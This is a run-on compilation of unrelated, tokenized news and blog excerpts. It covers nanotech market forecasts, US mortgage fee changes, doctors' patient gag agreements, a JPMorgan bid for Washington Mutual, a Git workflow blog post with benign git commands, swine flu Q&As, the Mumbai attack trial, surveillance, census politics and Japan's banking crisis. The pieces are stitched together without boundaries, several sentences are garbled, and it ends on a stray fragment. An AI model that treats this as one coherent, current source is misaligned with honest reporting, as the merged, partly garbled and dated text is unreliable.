His research sees nanotech pharmaceutical and healthcare products worth an estimated $ 3.2tn by 2012 , with military - use nanotech products taking 14 % of the total market and worth $ 40bn .
Nanotech products for the motor industry will make up a 4 % chunk of the market , while nano - foods are likely to corner up to 2 % .
Nanotech products designed to tackle water , air and soil pollution will also be big business in 2012 .
" In terms of environmentally beneficial materials , in some ways the Chinese are further along in their thinking than even the US , " says Harper .
" They are already putting together a system to work out how we can use these technologies for the good of the environment . "
The US may still lead the nano surge overall , but Harper believes China will be on a par with the EU and US by 2012 .
Richard Appelbaum , from the Center for Nanotechnology in Society at the University of California , puts the global nanotech market figure at $ 2.6tn by 2014 , or 15 % of manufacturing output in that year .
China , along with 40 other countries including the US , UK and Japan , is investing in nanotechnology " as a major key to global economic competitiveness " , he says .
If any one nation succeeds in cornering the giant 's share of the market , it " would be sufficient to confer global economic leadership on the country " , he adds .
Mortgage rates and house prices are down -- which sounds great for buyers and refinancers .
But mortgage industry underwriting and appraisal changes taking effect this month are putting new hurdles in the way of borrowers and loan officers .
Take Fannie Mae ’s and Freddie Mac ’s add - on fees for loans purchased after April 1 .
In some cases , applicants are being hit with extra fees of 3 % to 5 % because of the type of property they want to buy or refinance , their credit scores or the size of their down payment .
Some major lenders who sell loans to Fannie and Freddie are going further -- tightening underwriting rules beyond what either corporation requires .
For example , as of April 6 , Wells Fargo , one of the country ’s largest mortgage originators , imposed a new minimum FICO credit score of 720 -- up from the previous 620 -- on all conventional loans purchased through its wholesale system that have less than a 20 % down payment .
It also began requiring a total debt - to - income ratio maximum of 41 % -- down from the previous 45 % .
Fannie
Mae now has a mandatory fee of three - quarters of a percentage point on all condominium loans , no matter how high the applicant ’s credit score .
For a once - popular interest - only condo loan with a 20 % down payment and a borrower credit score of 690 , Fannie imposes the following ratcheted sequence of add - ons : one - quarter of a percentage point as an “ adverse market ” fee ; 1.5 % for the below - optimal credit score ; three - quarters of a percentage point for the interest - only payment feature ; and the same because the property is a condo .
The total comes to 3.25 % extra , which can be paid upfront or rolled into the loan .
On top of these extra fees , borrowers are now starting to get hit with two sets of cost - raising appraisal rule changes .
Fannie and Freddie have begun requiring all appraisers to complete an extra “ market condition ” report that includes detailed statistical analyses of local sales and pricing trends -- above and beyond the regular appraisal data .
Many appraisers are charging an extra $ 45 to $ 50 for the time required to complete the form .
Home buyers and refinancers can expect to pay the higher fees .
On top of that , beginning May 1 , Fannie and Freddie are refusing to fund loans with appraisals that do not follow a set of new rules known as the Home Valuation Code of Conduct .
Among the procedural changes : Mortgage brokers no longer can order appraisals directly , but instead must allow lenders or investors to use third - party “ appraisal management companies ” to assign the job to appraisers in their networks .
How does that affect the consumer ?
Consider the notification one Connecticut brokerage firm recently received from a major lending partner : Starting April 15 , all good faith estimates provided to applicants must indicate a flat $ 455 charge for appraisals arranged through the appraisal management company .
The broker previously charged $ 325 .
Consumers will now have to pay the appraisal fee upfront -- before any inspection or valuation is completed -- using a credit card , debit card or electronic fund transfer .
What happens if the appraisal comes in low and the applicants can’t qualify for the refi or purchase program they sought ?
Tough luck :
They ’ll have just two choices :
Pay another $ 455 for a second appraisal -- with no assurance that it will solve the problem -- or cancel the application .
Jeff Lipes , president of Family Choice Mortgage Corp. , which serves the Hartford , Conn. , area , said the net effect of the underwriting , credit score and pricing changes was to “ squeeze some people who are creditworthy by any reasonable standard out of the market . ”
For instance , as a result of the restrictions on condos , Lipes says “ whenever we hear the word ‘ condo ’ [ from an applicant ] , we shiver ” because the deck is stacked against them .
Even for prime borrowers with 800 FICO scores and 50 % down payments , Lipes said , “ I ca n’t tell them that we ’re certain we can get you a mortgage . ”
A welter of recent rule changes from Fannie Mae has made some condo units in projects with commercial tenants or high percentages of investor units almost impossible to refinance .
In Naples , Fla. , John Calabria , president of Bancmortgage Corp. , said , “ It has become such a nightmare to lend money ” because of the layers of add - on fees , higher mandatory down payments and FICO scores .
One high - income client sought to put down 25 % ( $ 200,000 ) to buy an $ 800,000 condo as a second home but could n’t because the minimum down payment on such a unit is now 30 % .
“ That ’s ridiculous , ” Calabria said .
“ Some of this just does n’t make sense . ”

Like donut shop owners , city councilmen , and smalltown gossip victims , doctors are n't terribly fond of patients leaving negative comments of them all over the Internet .
They , however , are n't taking the lawsuit route — at least not yet .
Instead , doctors are asking patients to sign agreements that bar them from posting comments on everything from review sites to blogs , and then attempting to have the reviews removed if they break the gag order .
In fact , these doctors are going so far as enlisting the help of monitoring companies that watch for negative posts attempting to �in check .
One such company is ( appropriately ) called Medical Justice , founded by North Carolina neurosurgeon Dr. Jeffrey Segal , whose entire business is built upon pushing patient waivers to doctors and then hunting out their commenting indiscretions online .
Segal advises the 2,000 or so doctors who employ his services to request that all patients sign the waiver .
If someone refuses , he says the doctor should suggest going somewhere else , though Segal claims he has not heard of a case where a doctor has turned away a longtime patient .
What 's the point of all this , though ?
Customers are " hungry for good information , " Segal told the Associated Press , but that 's apparently not what they 're getting when reading sites like RateMDs.com or random blog posts about doctors .
These " are little more than tabloid journalism without much interest in constructively improving practices , " he says , and could potentially damage a physician 's practice .
For their part , some sites that allow patients to review doctors are refusing to be bullied into taking down reviews , even if the reviewer in question has signed a waiver .
" They 're basically forcing the patients to choose between health care and their First Amendment rights , and I really find that repulsive , " RateMDs cofounder John Swapceinsk told the AP .
In fact , Swapceinsk is taking things a step further by putting up a Wall of Shame list of doctors who use patient waivers so that everyone can know who is engaging in these tactics .
Considering the upswing in review sites like Yelp and AngiesList , the public is growing accustomed to getting information like this from the Internet .
Not every patient is going to offer a fair and balanced view of a doctor visit ( just like not every Yelp reviewer has any idea what they 're talking about when they trash your favorite restaurant ) , but people should be to speak openly about their experiences . �
Review sites will only continue to increase in popularity — though potential customers should always take what they read online with a grain of salt .
Instead of fighting the trend , doctors need to embrace the new reality and maybe even use the reviews as an opportunity to improve themselves .
JPMorgan Chase in new bid for Washington Mutual
Jamie Dimon ’s JPMorgan
Chase is expected to make a new bid for Washington Mutual , the biggest building society in the US , after its credit rating was cut to junk by Standard & Poor’s .
The Wall Street bank , which bought Bear Stearns earlier this year , is said to be in ' advanced talks ' over buying the Seattle - based firm .
Dimon is understood to be dealing with the matter personally , and to be in talks with WaMu chief Alan Fishman .
Bid : JPMorgan Chase 's Jamie Dimon is expected to make a new bid for Washington Mutual
He reportedly approached WaMu earlier this year but was rebuffed .
He is said to have offered a stock - swap buyout at $ 8 a share .
The current share price is $ 2 , giving the company a market capitalisation of $ 3.40 billion ( £ 1.89 billion ) .
WaMu went instead with a $ 7 billion financing , selling a 13 % stake to TPG Capital that valued WaMu at $ 8.75 a share .
The share price has since fallen heavily .
S&P has put the building society on notice for possible future downgrades .

Just over a year ago , I complained about the complexity of Git tutorials found online .
My complaint was something like this : / I have no damn idea how Git works , and I 'm using it just fine .
Stop suggesting that people need to understand how all these things work and just explain the commands ./
I stand by this post , but now in a somewhat qualified way .
For most of my time using Git , I was using it as a one - user system .
I 'd commit locally , push and pull to my central remote repository , and that was about it .
If I wanted to work with someone , we 'd share a single remote to push and pull .
I was n't quite using it like Subversion , but at best I was using it like SVK .
For people who want to get started using Git , there 's no reason to learn how it all works .
Just committing and replicating to a single remote is dead easy , and does n't require any serious change of mindset .
In the meantime , I have been learning much more about how git works , mostly for fun , and to do some history rewriting on Pobox repositories before moving them to Git .
Still , I thought I had a good handle on how much needed to be explained .
I even started work on a somewhat sarcastic set of slides that would reject the " learn how git works before running git init " style of tutorial .
In the last month , I finished converting Pobox to Git .
It was a fair amount of work , but most of it was easy and fun .
On the first day of work in an " everyone must use git " environment , things went pretty well .
I gave a very breif overview of how to commit , push , and pull , and I threw some very simple documentation and flowcharts on our internal wiki .
Two weeks later , it was clear that this was not enough .
I was actually very happy with how things went , but without more explanation , I knew that things would not get better on their own .
Actually , thinking back on it , I 'm reminded of a professor who once told me , " Do n't worry .
Even though you 're failing every test , I think you 're on your way toward a B +. "
Everyone kept having problems , but they were problems that could be overcome , and many of which were the result of the workflow I 'd originally chosen for us .
Like Perl ,
Git has a very " There 's more than one way to do it ! " attitude .
You can roll out Git in many ways , depending on your personal needs or your company 's needs .
I had chosen poorly -- at least with respect to the kinds of discipline I expected to be used when merging .
Friday , I tried again : I got up and explained more about how merging works , what push and pull requests do , and how remotes are used to share changes .
I drew all the box and arrow diagrams that I thought I could avoid , originally .
It seemed to go pretty well .
Despite a few blasphemous interjections and remarks about glassy eyes , I actually think it managed to explain the basics needed to understand a simple collaborative DVCS workflow without getting too far into anything unrelated or overly technical .
I 'm hoping that two weeks from now , we 'll just be coasting along , smoothly sailing .
My sole concerns , now , remain with a few features that GitHub is lacking .
For the most part , GitHub is a great product for outsourcing repository hosting , but its private repositories do not allow read - only access , which makes certain operations very dangerous .
For example , I expect this error to come up now and then :
alice $ git remote add rjbs git@github.com :rjbs/pobox-mailredactor.git alice $ git fetch rjbs alice $ git checkout - b new - algo rjbs / new - algo alice $ vi bin / program alice $ git commit - a - m ' added new shared secrets ' alice $ git push
Alice may expect this to push back to her repository , because that 's what git would do in her master branch .
Unfortunately , git will try to push back to the remote branch she 's tracking -- in this case , rjbs / new - algo .
Because GitHub does n't allow read - only access , she will be trying to stomp my changes .
It would be nice to get a reminder that " you tried to push to rjbs / new - algo , but permission was denied . "
Even better , .git / config could indicate separate remotes for pull and push .
Push could go back to origin , but pull could pull from the tracked remote .
I 've already written one git command , git - hubclone , that forks on GitHub and then clones that and adds useful remotes .
I will probably write others to better encapsulate our workflow as time goes on .
In the end , I 'm very happy with our cutover to Git .
It went well , and I 'm already reaping the benefits .
I look forward to much , much more branching in our future .
Q. How infectious is swine flu ?
A . In the days since the disease was first reported in Mexico and the US it has spread across the world , triggering the World Health Organisation 's decision to raise the pandemic threat from level 3 to level 4 ( out of six ) .
Flu is one of the most infectious illnesses known and the WHO has already recognised that the outbreak cannot be contained .
Q. Will we see it spread like ordinary winter seasonal flu ?
Download the new Independent Premium app Sharing the full story , not just the headlines
A . That is not yet clear .
Outside Mexico , swine flu has not so far been shown to spread widely in the community .
Outbreaks appear to have been caused by travellers returning from Mexico spreading the virus in schools or to their families and close contacts .
The first confirmed cases in Britain , Iain and Dawn Askham of Falkirk , Scotland , who had been on honeymoon in Cancun , Mexico , had contact with 22 people in the week since they returned , of whom nine have developed symptoms that could be swine flu .
Q. How bad is it going to get ?
A . So far , cases outside Mexico have been mild .
No one knows how it is going to develop but the WHO has warned that it would be a mistake to be lulled into a false sense of security .
The 1918 Spanish flu pandemic started mildly – and went on to kill 20 to 40 million people round the world .
" I think we have to be mindful and respectful of the fact that influenza moves in ways we cannot predict , " Keiji Fukuda , WHO acting assistant director - general , said .
Q. Could it die away over the summer ?
A . Yes – but only temporarily .
Swine flu has struck at the end of the winter flu season in the northern hemisphere .
Flu normally dies away in summer , only to return the following winter .
The reasons are thought to be linked with the increase in ultraviolet light from longer days , which destroys the virus , and the fact that people spend less time huddled together indoors where it is easier to transmit the infection .
The worry is that if it subsides over the summer it could return with a vengeance next winter , in a more virulent form .
Professor Neil Ferguson , of Imperial College , London , said yesterday that up to 40 per cent of the population in Britain could be infected .
Q. Can I call the national flu line for advice ?
A . Not before next autumn .
Lord Darzi , health minister , said the dedicated telephone and web based advice service , which would be a key feature of the countries defence against a pandemic helping patients diagnose their symptoms and obtain anti-viral drugs , would not be up and running for six months .
The service is supposed to be capable of taking six million calls a week and come on line when the WHO raises the threat level to Phase 5 ( it is now Phase 4 ) .
Q. Is it worth taking Vitamin C ?
A. Alternative health practitioners of homeopathy , herbal remedies and nutritional medicine are recommending measures to protect against the flu .
They are about as useful as a water pistol against a forest fire .
---
Q Do masks provide protection against swine flu ?
A Yes , but probably not to the person wearing them .
They help stop the virus being expelled from the mouth and nose when coughing or sneezing , but are much less effective at protecting the wearer from a virus picked up on the hands or circulating in the air .
Wearing a mask thus becomes a public - spirited act .
Q Now swine flu has arrived in Britain how likely is it to spread ?
A Highly likely – if it has n't already .
There were 14 suspected cases under investigation in Britain yesterday .
It is a new virus , with a combination of genes from pigs , birds and humans , and has proved that it is easily transmitted from human to human .
As it is a novel virus , immunity to it is likely to be low and almost anyone could be vulnerable .
Q Should Britain screen travellers at its borders ?
A Flu is one of the most infectious illnesses known – one cough by an infected person can transmit the virus to a roomful of people .
The disease takes up to seven days to produce symptoms so most travellers would not know they were infected until after they reached their destinations .
Screening at airports and land borders may pick up some travellers but the effect would be limited .
Politicians like to impose border controls because it shows they are doing something .
Q Will this outbreak develop into a pandemic ?
A It has all the hallmarks of one and has already been identified on both sides of the Atlantic .
Just how rapidly it is spreading will be confirmed in the coming days .
What we do n't know is how virulent the virus is .
While some victims have died , others have recovered after only a mild bout of illness .
Q What defence do we have against swine flu ?
A Better than we did against the last pandemics in 1957 and 1968 .
We have a stockpile of anti-viral drugs – Tamiflu and Relenza – which we did not have then .
We also have a pandemic plan , drawn up by the Government since avian flu became a threat in 2003 , which sets out what is to be done – from distributing the drugs and setting up helplines to closing schools and banning public events .
Q Has the pandemic plan ever been tested ?
A Yes , in one of the biggest emergency planning exercises since the end of the Cold War that took place in 2007 .
It involved hundreds of health officials across the country .
Q Are there enough anti-viral drugs ?
A Not according to the Tories .
The Government says it has over 30 million courses of the drugs , enough for half the population .
The Tories say this is not enough if family members of an infected person are to be treated prophylactically .
In that case , enough drugs to cover three - quarters of the population will be necessary , they say .
Q How do anti-viral drugs work ?
A Two anti-viral drugs have been licensed in Britain in the last decade : Tamiflu and Relenza .
The problem with the flu virus is that it is constantly mutating , so a new vaccine has to be produced each year .
The anti-viral drugs get round this by targeting not the virus itself but an enzyme that enables the virus to spread from cell to cell .
Provided they are taken within 48 hours of the onset of symptoms they can shorten the illness and reduce its severity .
Q What is the difference between Tamiflu and Relenza ?
A The big difference is that Tamiflu is taken as a pill while Relenza is inhaled directly into the lungs .
Q Why has the Government got both drugs in its stockpile ?
A Because resistance has emerged in flu strains in some countries , rendering the drugs ineffective .
Q What about a vaccine ?
A Pandemics tend to happen in waves separated by several months , so a vaccine could potentially be developed against the second or third wave , if they occur .
A vaccine first has to be matched to the exact strain of the virus and then incubated in hen 's eggs , which may take up to six months .
Hundreds of millions of doses would be required which would put huge pressure on the world 's laboratories .
Q Should n't a vaccine be the first priority ?
A Previous vaccines against swine flu have turned out to be worse than the disease .
An outbreak in the US in 1976 infected 200 people , of whom 12 were hospitalised and one died .
But before it was over 40 million people had been vaccinated , 25 of whom died and 500 of whom developed Guillain - Barre syndrome , which can be fatal .
---
Q : What is swine flu ?
A : Much the same as human flu – but in pigs .
The worry is that pigs are excellent hosts for the virus .
And because they are genetically close to humans , they can pass the virus to us more easily than birds can .
The great fear over the past decade has been that the avian flu virus , H5N1 , would infect pigs which would act as a reservoir for its transmission to humans .
Luckily for the world , apart from a few isolated outbreaks , this did not happen .
Q : How worried should we be ?
A : At this stage , no one knows .
The virus that has caused the outbreak is a strain of the H1N1 type that contains bird , pig and human genes in a combination never seen before .
Immunity to it will thus be limited .
Scientists are working to establish the precise nature of the virus , the symptoms it causes and its capacity to cause disease and death .
Q Has swine flu infected humans before ?
A : Yes .
There have been rare cases since the 1950s , mostly in people such as farmers who work directly with pigs .
In Europe , 17 cases have been reported since 1958 .
In the US , an outbreak at a military camp in New Jersey in 1976 , infected over 200 soldiers , of which 12 were hospitalised and one died .
Q What are the symptoms of swine flu ?
A : Similar to ordinary human flu – cough , sudden fever , headache , muscle pains .
In severe cases , it may lead to pneumonia , multi-organ failure , and death .
The incubation period for ordinary human flu is two to five days .
Q : Can it be treated ?
A : Yes – up to a point .
Early indications are that patients in Mexico and the US have been successfully treated with the antiviral drugs Tamiflu and Relenza .
These drugs cannot prevent flu but they can limit its severity , and thus save lives , if taken as soon as symptoms develop .
However , the swine flu has proved resistant to older anti-virals such as amantadine .
Q : Is Britain prepared for a pandemic ?
A : Better than it was five years ago .
A pandemic plan has been prepared detailing action by everyone from pharmacists , who will hand out anti-viral drugs , to hospitals handling the seriously ill , to mortuaries which may have to be temporarily expanded .
Over 14 million courses of Tamiflu have been stockpiled and the Government announced last year it was doubling the amount to provide enough for half the population .
Q : How bad might a pandemic be ?
A : At its worst , it could have a devastating global impact , greater than a terrorist attack , nuclear accident or environmental disaster .
The World Health Organisation estimates that a mild pandemic could cause up to 7.5 million deaths .
In the UK , Sir Liam Donaldson , the Government 's Chief Medical Officer , has said that in the worst case scenario the country could face up to 750,000 deaths .
However , in the flu pandemics of 1957 and 1968 most victims recovered .
There was no panic , cities did not empty , travel did not come to a halt and economies were n't devastated .
Each of those pandemics killed 50,000 people in the UK and around one million worldwide .
In a normal year , flu kills 12,000 to 20,000 mainly elderly people in Britain and 250,000 around the world .
Q : Who is at greatest risk ?
A : In Mexico , the virus appears to be targeting those aged 20 to 40 .
This is not unusual – the same occurred during the worst pandemic of the last century , in 1918 , when 20 to 40 million people died .
Young healthy people with strong immune systems react most powerfully to the virus but the very strength of their reaction produces inflammation and secretions in the lungs which can be overwhelming .
In the US , the virus appears to be targeting children who are suffering only mild illness .
The difference in the two countries is so far unexplained .
One hypothesis is that a second virus may be circulating in Mexico which is interacting with the swine flu virus to produce more severe symptoms .
Q : How can I protect my family ?
A : By acquiring a stock of anti-viral drugs such as Tamiflu or Relenza , available only on prescription at an NHS cost of around £ 20 for a course of 10 doses ( enough for one person ) .
Otherwise , the best defence is strict personal hygiene .
It is hard to better the advice printed by the ' News Of the World ' on 3 November 1918 : " Wash inside nose with soap and water night and morning ; force yourself to sneeze night and morning , then breathe deeply .
Do not wear a muffler , take sharp walks regularly and walk home from work ; eat plenty of porridge . "
Porridge is , of course , a known cure - all – but the rest of the advice holds as true today as it did then .
Q : Is there a vaccine against it ?
A : Not in humans ( there is in pigs ) .
Ordinary seasonal flu vaccine for humans might offer some protection because there are similarities between the H1N1 human flu viruses and the new H1N1 pig flu virus .
Investigations are under way to see if the seasonal vaccine would have a protective effect but those will " take some time " .
Q : Why has this outbreak started in Mexico and the US ?
A : No one knows , but it is certainly a surprise .
The next threat was expected to come from the Far East .
Avian flu has spread through poultry populations , and 400 humans have been infected , 250 of whom have died .
Health experts warned that a small mutation to the virus could turn a rare but lethal disease into one which could threaten the entire planet .
Now , the threat has emerged – but on the other side of the world .
Q : Is it safe to eat pork ?
A : Yes .
Cooking destroys the virus .
An ideal interest rate to help the US economy to cope with the recession would be a negative 5 percent , the Financial Times reported on its Web site , quoting an internal Federal Reserve analysis .
It said the analysis was based on a so - called Taylor - rule approach , which estimates an appropriate interest rate based on unemployment and inflation .
Fed policy makers meet for two days starting Tuesday , but are widely expected to hold fire and assess the effects of the measures already taken to boost the economy .
" We see little reason to expect major policy changes , " Goldman Sachs economists wrote in a note to clients , quoted by Reuters .
In March , the US central bank announced plans to inject an additional $ 1.1 trillion into the economy , buying mortgage debt and Treasurys .
As rates cannot be cut below zero , the Fed 's internal research suggests it should maintain unconventional policies that provide stimulus roughly equivalent to an interest rate of minus 5 percent , the Financial Times wrote .
Fed staff suggested the central bank may need to expand its asset purchases beyond the $ 1.1 trillion already pledged , the paper said .
But the Fed is likely to ponder carefully what its next move will be , to see how the financial conditions respond to the quantitative easing measures it has already taken , the paper added .
There is intense security at the trial at the Arthur Road jail
The leading suspect in the Mumbai ( Bombay ) attacks trial has retracted his confession .
The lawyer for the sole surviving suspected gunman , Mohammed Ajmal Amir Qasab , said it was extracted through coercion and force .
The prosecution had read out parts of his confession as the trial began and accused him of killing 166 people .
Prosecutor Ujwal Nikam said this was a conspiracy hatched in Pakistan to wage war on India .
Friday 's opening of the trial followed a number of procedural delays .
The latest was on Wednesday when Mr Qasab 's lawyer was sacked for allegedly also signing up to defend a victim .
More than 170 people , including nine gunmen , were killed in the attacks last November .
' Minor ' Mr Qasab , who police say is 21 , is charged with murder and waging war on India .
He faces the death penalty if convicted .
MAIN QASAB CHARGES
Murder , waging war on India Firing at CST train station Firing inside and outside Cama Hospital Hijacking of Skoda vehicle Murder of MV Kuber boatman Firing at Girgaum Chowpatty beach
Retracted confession read in court Mumbai accused relaxed in court Two Indians , Fahim Ansari and Sabauddin Ahmed , are also on trial , accused of being members of the Lashkar - e - Taiba militant group and of scouting for the attacks .
Mr Nikam opened the prosecution argument , saying the Mr Qasab was responsible for the murder of 166 people .
" Even though Qasab was actually not present at the time of the firing incidents in hotels Taj and Trident , and Nariman House , he can be held liable for the murders as one of the co-conspirators , " Mr Nikam said .
He said the gunmen had training from " intelligence professionals " but did not at that point mention Pakistan by name .
Mr Nikam spoke of a " major general " who had attended the training of the suspects and informed them of the use of the sea route to attack Mumbai .
The attackers were told to kill American , British and Israeli nationals as they had caused harm to Muslims , Mr Nikam said .
Mr Qasab did not smile or speak .
His new lawyer , Abbas Kazmi , claimed Mr Qasab was under 18 years of age and therefore should be tried in a juvenile court .
The application was rejected .
Mr Kazmi then formally filed for retraction of the confession that was made in front of a magistrate in February .
It will be up to the judge to weigh the evidence at the trial and decide whether the confession should be taken into account .
Under pressure India has accused Pakistan - based fighters from Lashkar - e - Taiba of carrying out the attacks .
Pakistan has admitted they were partly planned on its soil .
Mr Qasab was arrested on the first day of the attacks and has been in custody ever since .
A huge security operation has been launched for the trial involving hundreds of armed police and soldiers .
Proceedings were set to start formally on Wednesday but Mr Qasab 's lawyer , Anjali Waghmare , was dismissed for " professional misconduct " .
She was alleged to have also signed up to represent victim Sri Vardhan Kar , but has denied agreeing to represent him .
On Thursday the court appointed Mr Kazmi , a top criminal lawyer from Mumbai , to replace her .
This case has generated huge interest in India , whose citizens were outraged by what they saw as the inability of their leaders to protect them in November .
India 's government is under pressure to deliver results in the case , especially with the first phase of voting in the country 's general elections getting under way on Thursday .

Ramazan Baydan insists his firm made the shoe thrown at President Bush A Turkish shoe firm says it has had to take on 100 extra staff to cope with a surge in orders after an Iraqi threw shoes at US President Bush .
Istanbul - based Baydan
Shoes claims it made the shoes and says it now has tens of thousands of orders from around the world - including from the US and Iraq .
The shoe was called Model 271 but has been renamed Bush shoe , the firm said .
However , the brother of shoe - throwing journalist Muntader al - Zaidi says he believes the shoes were Iraqi-made .
Durgham al - Zaidi criticised people he said were trying to exploit his brother 's actions for commercial gain .
" The Syrians claim the shoes were made in Syria and the Turks say they made them .
Some say he bought them in Egypt .
But as far as I know , he bought them in Baghdad and they were made in Iraq , " he told the AFP news agency .
It is difficult to verify exactly where the shoe is from as Mr Zaidi has not been seen in public since the incident eight days ago , and the judge in the case says the shoes were destroyed during security checks .
Trial date But Oner Bogatekin , Baydan Shoes ' export representative , said the staff recognised their handiwork from the news reports .
" We saw it on videos and also in newspapers .
We have been producing this shoe for 10 years , so know it very well and we can recognise them anywhere , " he told the BBC .

He said there had been a four - fold interest in the shoe - now dubbed Bush shoes or Bye Bye Bush shoes - and had to take on 100 extra workers to cope with the demand .
According to the shop 's owner , Ramazan Baydan , a US firm has ordered 18,000 pairs , a further 15,000 pairs are destined for Iraq and a British distributor has asked to be the firm 's European sales representative .
Mr Bogatekin said the firm was pleased with the publicity it was getting , but insisted the shoes would not have done President Bush any serious harm .
" Actually , they are not heavy shoes so they would n't hurt him , " he said .
Muntadar al - Zaidi has been hailed a hero by some for throwing his shoes at President Bush during the Baghdad news conference on 14 December .
The action is seen as a grave insult in the Arab world .
He called Mr Bush a " dog " , and said he was acting for " widows and orphans and all those killed in Iraq " .
He is due to face trial on 31 December accused of " aggression against a foreign head of state " , which carries a jail sentence of up to 15 years .

Is it a ' good ' thing that Britain , the United States , and several other countries are developing more sophisticated surveillance technology ?
The premise that individuals have nothing to hide and nothing to fear in a ' big brother ' society is nothing more than a myth riddled with false assumptions .
A multitude of problems can arise from continuously gathering too much data .
Trusting the government and private companies -- entities full of people , some of which will inevitably have an immoral few -- make it easier for data to be misused and error prone .
That said , people who have nothing to hide and nothing to fear may eventually find their data misused in the future .
( Source : computerweekly.com )
With the advent of data - mining , thinking that a single entity holds your collected information is a dangerous and misleading fallacy .
Your personal information held by the government will eventually be shared , within the government and with the private sector .
Regardless of whatever safeguards may have been implemented to safeguard your personal information , it 's a question of when -- not if -- said data will end up being corrupted or lost .
Due to the massive amounts of data collected , occasional inconsistencies will occur .
Having a humongous database that is completely accurate 100 % of the time is a pipe dream .
For example , look at the infamous U.S. No Fly List .
As history has repeatedly proven , this is never achieved .
When Your Personal Data is Corrupted or Lost
If your name resembles an alleged terrorist -- as was the case with Khalid El - Masri , a German national who was rendered to Afghanistan and brutally tortured due to a case of mistaken identity -- you 're more than likely going to have some major problems in today 's surveillance society .
You could end up finding your personal information -- in its naked glory , so to speak -- posted on the Internet for the whole world to see .
You could end up being wrongfully arrested .
You could find yourself losing your job or erroneously stigmatized as a criminal or sex offender because human error resulted in your personal information be incorrectly entered into the database .
Mistakes like these are becoming increasingly common .
Now that some police cars are being fitted with fingerprint scanners and the upcoming ability to check your DNA on the spot , a new breed of lost and corrupted data will emerge .
Nothing Justifies Invasions of Privacy
Everyone has something to hide .
No one wants to be filmed 24 hours a day or have their intimate activities and preferences , medical records , financial data and other personal information accessible to the rest of the world .
The premise that you have nothing to hide and nothing to fear is a myth , as recently noted by Computer Weekly .
It insults intelligence and disregards reality .
( Source : computerweekly.com )
The same personal information collected for commercial purposes can be used for criminal purposes .
Privacy is important because without it , information will be abused by those in power even if we 're doing nothing wrong at the time of surveillance .
Privacy protects us from that abuse .

Get Ready For the U.S. Census Fight , Chicago - style
Republicans are fit to be tied over the Obama administration 's Tom DeLay - style strategy of removing the U.S. Census Bureau from the jurisdiction of the Commerce Department and transfering it to the White House .
Their biggest fear , of course , is that with the 2010 census looming , Democrats will attempt to redraw congressional districts to their party 's ultimate benefit .
( Not that Republicans have ever used politics as their guiding tool in carving out congressional districts to their liking , right Mr. Delay ? )
" With all of its political implications , hijacking the Census from the Commerce Dept . and letting it be run out of Rahm 's office is like putting PETA in charge of issuing hunting permits , " a Senior Republican Senate Aide fumed to the Sleuth .
( The aide said he needed to remain anonymous for fear of " being redistricted -- Chicago style . " )
So is the White House trying to pull a Tom DeLay ?
" All DeLay did was rearrange the deck chairs , " said the irate GOP aide , adding , " this would allow Rahm to redesign the whole ship affecting everything from congressional districts to who and where eligible S - CHIP children , adults and ' poor ' rich people live . "
House Minority Leader John Boehner also blasted the White House move today .
In a statement , he said , " The United States Census should remain independent of politics ; it should not be directed by political operatives working out of the White House . "
The New York Times -- a day before it was revealed that Obama would be removing the census from the Commerce Department 's jurisdiction -- editorialized on Wednesday that Sen. Judd Gregg ( R - N.H. ) might not be the best choice to lead the agency tapped with conducting next year 's census , given that he has routinely tried to cut census funding :
" Mr. Gregg was never a friend of the census , " the editorial said .
" As chairman of the Senate committee that oversees the Commerce Department 's budget , he frequently tried to cut the bureau 's financing .
In 1999 , he opposed emergency funds for the 2000 census requested by President Bill Clinton and the Republican - controlled House . "
Problem solved on that front .
Voila , the very next day , a Congressional Quarterly report revealed President Obama would be moving the Census over to the White House .
Stay tuned ... the census fight will get interesting , and ugly .

Money Morning
Experts on the Japanese financial crisis , which culminated in 10 years of stagnation known as the " Lost Decade , " are fearful that the United States is making similar mistakes with its recent bailout efforts .
The two meltdowns started in much the same way – with busted stock - and - real - estate bubbles .
With both the United States and Japan , whose market manias ignited by laughably loose credit policies , smoldered under a lack of oversight from government regulators , market analysts or such private - sector sentinels as credit - rating agencies , and were finally fanned into a frenzied financial conflagration by the promise of easy profits .
The real estate bubble popped and Japan paid the price then , as the United States is paying now .
Banks were left holding trillions of yen in loans that were virtually worthless .
By early 2004 , houses were selling at 1/10th their peak value , and commercial real estate was selling for less than 1/100th of its peak - market value .
The Nikkei 225 stock index had dropped by almost three - quarters from its heights .
All told , an estimated $ 20 trillion in stock market and real - estate wealth vaporized ( although one could easily argue that the peak values were n't real to start with ) .
Over the course of a decade , a succession of government policymakers waded through the crisis and routinely fell short of solving it .
The Japanese lowered interest rates , increased government spending , pumped cash directly into banks and even tapped private capital to help buy some of the bad assets from banks .
All of these measures failed .
Japanese taxpayers are estimated to have recouped less than half of what it cost the government to bailout the nation 's banking sector .
Yet , the U.S. government has employed many of the exact same tactics .
The benchmark Federal Funds rate stands a range of 0.0 % to 0.25 % .
More than $ 350 billion has been poured into financial institutions in an effort to shore up their balance sheets and spur lending .
And last week , newly appointed Treasury Secretary Timothy Geithner outlined his proposal for a Public - Private Investment Fund , which will buy up many of the toxic assets that have bogged down banks ' balance sheets .
" I thought America had studied Japan 's failures , " Hirofumi Gomi , a top official at the Japanese Financial Services Agency , told the International Herald Tribune .
" Why is it making the same mistakes ? "
Indeed , many analysts believe the largest U.S. banks to be insolvent , with more liabilities on their balance sheets than assets .
These analysts believe the only thing left for U.S. officials to do is the same thing Japan ended up doing :
Force major banks to declare their bad debts , and then weed out the weakest and recapitalize the survivors .
Japan 's delay in aggressively seizing control of the banking sector cost the economy trillions of dollars and years growth .
" The historical record shows that you have to do it eventually , " Adam S. Posen , a senior fellow at the Peterson Institute for International Economics , told the New York Times .
" Putting it off only brings more troubles and higher costs in the long run . "
Nouriel Roubini , a professor of economics at the Stern School of Business at New York University , estimates that total losses on loans by U.S. financial firms and the fall in the market value of the assets they hold will reach $ 3.6 trillion , with half of that risk falling squarely on the shoulders of banks .
" The United States banking system is effectively insolvent , " Roubini said .
However , the government is hoping that over time , the economy will start to recover and some of the bad debt that banks are currently holding will start to regain its value .
" If [ financial institutions ] had to sell these securities today , the losses would be far beyond their capital at this point , " Raghuram Rajan , a professor of finance and economist at the University of Chicago told the Times .
" But if the prices of these assets will recover over the next year or so , if they do n't have to sell at distress prices , the banks could have a new lease on life by giving them some time . "
The strategy has worked before , notably during the Latin America debt crisis of the 1980s .
The total risk to the nine money - center banks in New York was estimated at more than three times their capital , the Timesreported .
But regulators did not force those banks to value the loans at the hugely depreciated value of the market and averted a catastrophe .

The Law
